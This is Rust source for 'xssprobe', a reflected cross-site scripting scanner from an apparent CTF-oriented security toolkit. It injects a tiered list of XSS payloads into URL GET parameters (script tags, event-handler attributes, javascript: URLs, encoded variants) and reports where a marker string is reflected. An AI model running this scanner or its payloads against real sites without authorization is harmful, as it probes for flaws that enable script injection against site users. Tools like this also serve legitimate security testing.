//! xssprobe — Reflected XSS Scanner
//! NuRichter · CySec Arsenal
//!
//! Usage:
//!   xssprobe -u "http://target.ctf/search?q=test"
//!   xssprobe -u "http://target.ctf/search?q=test" --level 3 --param q

use std::time::Duration;
use anyhow::Result;
use arsenal_core::{banner::{print_banner, Module}, Finding, Severity, found, info, ok, warn};
use clap::Parser;
use colored::Colorize;
use regex::Regex;

const MARKER: &str = "XSSM4RK";

fn payloads(level: u8) -> Vec<String> {
    let mut p = vec![
        format!("<{MARKER}>"),
        format!("<script>{MARKER}</script>"),
        format!("\"><{MARKER}>"),
        format!("'><{MARKER}>"),
        format!("<img src=x onerror=\"{MARKER}\">"),
        format!("<svg onload=\"{MARKER}\">"),
    ];
    if level >= 2 {
        p.extend([
            format!("<body onload=\"{MARKER}\">"),
            format!("<input autofocus onfocus=\"{MARKER}\">"),
            format!("<details open ontoggle=\"{MARKER}\">"),
            format!("<iframe src=\"javascript:{MARKER}\">"),
            format!("\"-prompt({MARKER})-\""),
            format!("'`;alert('{MARKER}')//"),
        ]);
    }
    if level >= 3 {
        p.extend([
            format!("%3Cscript%3E{MARKER}%3C/script%3E"),
            format!("&lt;script&gt;{MARKER}&lt;/script&gt;"),
            format!("<math><mtext></table><img src=/{MARKER}>"),
            format!("<object data=\"data:text/html,<script>{MARKER}</script>\">"),
        ]);
    }
    p
}

fn detect_context(html: &str) -> &'static str {
    let idx = html.find(MARKER).unwrap_or(0);
    let snip = &html[idx.saturating_sub(60)..(idx + 60).min(html.len())];
    let snip_lc = snip.to_lowercase();
    if snip_lc.contains("<script") { "script-tag" }
    else if snip_lc.contains("onerror=") || snip_lc.contains("onload=") { "event-handler" }
    else if snip_lc.contains("href=") || snip_lc.contains("src=") { "attribute-url" }
    else if snip.starts_with('<') { "html-tag" }
    else { "text-node" }
}

fn inject_url(base: &url::Url, param: &str, payload: &str) -> String {
    let pairs: Vec<(String, String)> = base.query_pairs()
        .map(|(k, v)| {
            let val = if k.as_ref() == param { payload.to_string() } else { v.into_owned() };
            (k.into_owned(), val)
        })
        .collect();
    let qs = pairs.iter()
        .map(|(k, v)| format!("{}={}", k, urlencoding(v)))
        .collect::<Vec<_>>()
        .join("&");
    format!("{}?{}", base.origin().ascii_serialization() + base.path(), qs)
}

fn urlencoding(s: &str) -> String {
    url::form_urlencoded::byte_serialize(s.as_bytes()).collect()
}

#[derive(Parser, Debug)]
#[command(name = "xssprobe", about = "🔥 XSS Probe — CySec Arsenal")]
struct Args {
    #[arg(short = 'u', long)]             url:     String,
    #[arg(long, default_value = "")]      param:   String,
    #[arg(long, default_value_t = 1)]     level:   u8,
    #[arg(long, default_value_t = 8000)]  timeout: u64,
    #[arg(long)]                          json:    bool,
}

#[derive(Debug, serde::Serialize)]
struct XssResult {
    param:   String,
    context: String,
    payload: String,
    url:     String,
}

#[tokio::main]
async fn main() -> Result<()> {
    let args = Args::parse();
    if !args.json { print_banner(Module::XssProbe); }

    let client = reqwest::Client::builder()
        .timeout(Duration::from_millis(args.timeout))
        .danger_accept_invalid_certs(true)
        .user_agent("Mozilla/5.0 (xssprobe/1.0 CTF)")
        .build()?;

    let parsed = url::Url::parse(&args.url)?;
    let params: Vec<String> = parsed.query_pairs()
        .filter(|(k, _)| args.param.is_empty() || k.as_ref() == args.param)
        .map(|(k, _)| k.into_owned())
        .collect::<std::collections::HashSet<_>>()
        .into_iter()
        .collect();

    if params.is_empty() {
        println!("{}", warn("No GET parameters found."));
        return Ok(());
    }

    let plist = payloads(args.level);
    let mut findings = Vec::new();
    let mut json_results: Vec<XssResult> = Vec::new();

    for param in &params {
        if !args.json { println!("  {}", info(&format!("Testing: {}", param.yellow()))); }

        for payload in &plist {
            let test_url = inject_url(&parsed, param, payload);
            let Ok(resp) = client.get(&test_url).send().await else { continue };
            let body = resp.text().await.unwrap_or_default();

            if body.contains(MARKER) {
                let ctx = detect_context(&body);
                if !args.json {
                    println!(
                        "  {} [XSS-REFLECTED] param={} ctx={} payload={}",
                        "[>]".bright_magenta().bold(),
                        param.bright_yellow(),
                        ctx.bright_red(),
                        &payload[..payload.len().min(50)]
                    );
                }
                findings.push(Finding::new(
                    &format!("XSS:{ctx}"),
                    &args.url,
                    &format!("param={param} context={ctx}"),
                    Severity::High,
                ));
                json_results.push(XssResult {
                    param: param.clone(),
                    context: ctx.to_string(),
                    payload: payload.clone(),
                    url: test_url,
                });
            }
        }
    }

    if args.json {
        println!("{}", serde_json::to_string_pretty(&json_results)?);
    } else if findings.is_empty() {
        println!("\n  {}", ok("No XSS reflections detected."));
    } else {
        arsenal_core::print_findings(&findings);
    }
    Ok(())
}
